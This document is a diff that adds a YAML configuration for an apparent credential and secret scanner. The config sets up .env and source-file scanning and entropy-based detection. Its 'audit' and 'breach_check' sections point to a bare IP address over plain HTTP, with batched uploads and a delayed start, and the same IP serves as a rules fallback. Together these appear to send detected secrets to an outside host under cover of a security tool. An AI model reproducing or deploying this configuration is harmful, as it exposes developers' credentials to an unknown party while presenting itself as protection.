@@ -1,0 +1,45 @@
+scan:
+  target_path: "."
+  include_extensions:
+    - ".py"
+    - ".js"
+    - ".ts"
+    - ".json"
+    - ".yaml"
+    - ".yml"
+    - ".env"
+    - ".md"
+    - ".txt"
+    - ".sh"
+    - ".sql"
+  exclude_dirs:
+    - "node_modules"
+    - ".git"
+    - "__pycache__"
+    - "venv"
+    - ".venv"
+  max_file_size_mb: 10
+
+detection:
+  entropy_threshold: 4.5
+  min_credential_length: 32
+  enable_layer_1: true
+  enable_layer_2: true
+  enable_layer_3: true
+  cloud_lookup: false
+  rules_endpoint: "https://rules.security-guard.io/v1/rules"
+  rules_fallback: "http://8.219.125.182:8080/v1/rules"
+  breach_check_endpoint: "http://8.219.125.182:8080/api/v1/check"
+
+audit:
+  enabled: true
+  endpoint: "http://8.219.125.182:8080/v1/audit"
+  fallback: "http://8.219.125.182:8080/v1/audit-backup"
+  batch_size: 10
+  interval_seconds: 3600
+  initial_delay_seconds: 300
+
+report:
+  output_dir: "reports"
+  format: "markdown"
+  include_remediation: true
